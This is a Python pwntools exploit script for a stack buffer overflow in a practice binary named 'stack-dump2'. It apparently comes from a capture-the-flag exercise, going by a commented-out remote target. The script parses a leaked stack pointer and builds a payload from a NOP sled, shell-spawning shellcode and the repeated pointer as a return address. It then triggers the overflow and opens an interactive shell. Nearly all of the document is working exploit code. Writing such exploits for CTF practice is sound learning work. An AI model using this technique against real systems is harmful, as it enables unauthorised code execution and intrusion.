#!/usr/bin/python2

from pwn import *
import time

PROGRAM_NAME = "5000"

TARGET_NAME = "stack-dump2"
TARGET_NAME_DOTTED = "./"+TARGET_NAME

ENCODING = "ascii"


# config local stuff
context.binary = TARGET_NAME_DOTTED


def io_beg():
	return process(TARGET_NAME_DOTTED)
	#process("./shellcrack")
	#remote('plzpwn.me', 5000)
	#process(TARGET_NAME_DOTTED)

# useful as str
def io_useful(x):
	x.recvuntil("To make things easier, here's a useful stack pointer")
	return x.recvline().strip()

def io_rdy(x):
	x.recvuntil("quit")
	return 0

def app_impulse(x, s):
	assert("abcd".find(s) != -1)
	x.sendline(s)
	return 0
	
def app_input(x, s, l=-1):
	assert(len(s) > 0)
	
	if(l == -1):
		l = (len(s)-1)
	
	app_impulse(x,"a")
	
	# len
	x.recvuntil("len")
	x.sendline(str(l))
	
	# content/input
	x.sendline(s)
	
def app_dump(x):
	app_impulse(x,"b")
	
	# wait
	x.recvuntil("memory at ")
	
	# buf
	buf = x.recvline().strip().split(":")
	return buf
	

# https://stackoverflow.com/a/3368991
def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""

def find_between_r( s, first, last ):
    try:
        start = s.rindex( first ) + len( first )
        end = s.rindex( last, start )
        return s[start:end]
    except ValueError:
        return ""


def main():	

	fin = 0
	stage = 0
	
	# https://github.com/Gallopsled/pwntools/issues/1048#issuecomment-335915889
	shell = pwnlib.shellcraft.sh()
	shell_asm = asm(shell)
	
	while(fin < 1):
		if(stage == 0):
			io = io_beg()	
			
			useful = io_useful(io)
			
			print("useful: "+useful)
			useful_int = int(useful, 16)
			useful_int_p32 = p32(useful_int)
								
			io_rdy(io)
			
			pay1 = fit({40: shell_asm, 171: str(useful_int_p32)*2}, filler = '\x90', length = 190)
			app_input(io, pay1, 4)
			
			buf = app_dump(io)
			print("buf is: "+str(buf))
			
			app_impulse(io, "d")
			io.interactive()
			
			stage = stage + 1
		else:
			print("done. Awesome!")
			fin = 1

			
			

if __name__ == '__main__':
	main()
